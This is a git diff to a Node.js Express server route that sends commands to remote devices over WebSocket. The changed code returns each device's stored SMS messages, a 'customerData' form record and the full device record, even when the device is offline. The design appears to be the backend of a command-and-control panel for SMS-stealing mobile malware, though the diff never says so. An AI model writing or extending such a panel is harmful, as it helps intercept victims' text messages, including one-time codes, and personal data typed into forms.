@@ -188,33 +188,42 @@ app.post('/api/command', async (req, res) => {
   try {
     const { deviceId, action, data } = req.body || {};
     if (!deviceId || !action) return res.status(400).json({ success: false, message: 'Missing deviceId or action' });
-    // Try to read device from DB, but do not fail hard if DB has write-concern issues.
+    // Read device from store (DB or in-memory). Do not fail hard on DB issues.
     let device = null;
-    try {
-      device = await Device.findOne({ deviceId }).lean();
-    } catch (dbErr) {
-      console.error('DB lookup error for /api/command (continuing):', dbErr && dbErr.message);
-      device = null;
-    }
+    try { device = await findOneInStore({ deviceId }); } catch (dbErr) { console.error('Store lookup error for /api/command (continuing):', dbErr && dbErr.message); device = null; }
 
     const clients = global.deviceSockets.get(deviceId);
 
-    // Special-case VIEW_SMS: if we have DB messages return them, otherwise ask device to send
-    if (action === 'VIEW_SMS') {
-      if (device && Array.isArray(device.smsMessages)) {
-        return res.json({ success: true, messages: device.smsMessages || [] });
-      }
-      // If device connected, send command to request SMS list and return success
-      if (clients && clients.size) {
+    // Handle view actions with offline support: return stored data immediately and trigger background refresh if online
+    if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
+      const isOnline = clients && clients.size > 0;
+
+      // Trigger background refresh if device is connected
+      if (isOnline) {
         clients.forEach((client) => {
-          try { if (client.readyState === WebSocket.OPEN) client.send(JSON.stringify({ command: 'VIEW_SMS', data: {} })); } catch (e) { console.error('WS send error:', e && e.message); }
+          try { if (client.readyState === WebSocket.OPEN) client.send(JSON.stringify({ command: action, data: {} })); } catch (e) { console.error('WS send error:', e && e.message); }
         });
-        return res.json({ success: true, message: 'Requested SMS from device' });
       }
-      return res.json({ success: false, message: 'No SMS available and device not connected' });
+
+      if (!device) {
+        // If no stored data but we asked device to send it, return a success message.
+        if (isOnline) return res.json({ success: true, isOnline, message: 'Requested data from device' });
+        return res.status(404).json({ success: false, message: 'Device not found' });
+      }
+
+      const responseData = { success: true, isOnline };
+      if (action === 'VIEW_SMS') {
+        let messages = device.smsMessages || [];
+        messages = messages.slice().sort((a, b) => (b.date || b.time || 0) - (a.date || a.time || 0));
+        responseData.messages = messages;
+      }
+      if (action === 'VIEW_FORM') responseData.customerData = device.customerData || {};
+      if (action === 'VIEW_DATA') responseData.device = device;
+
+      return res.json(responseData);
     }
 
-    // For other actions, allow sending to connected sockets even if DB lookup failed
+    // For non-view actions: require device to be connected and forward command
     if (!clients || clients.size === 0) return res.json({ success: false, message: 'Device not connected' });
 
     let sentCount = 0;
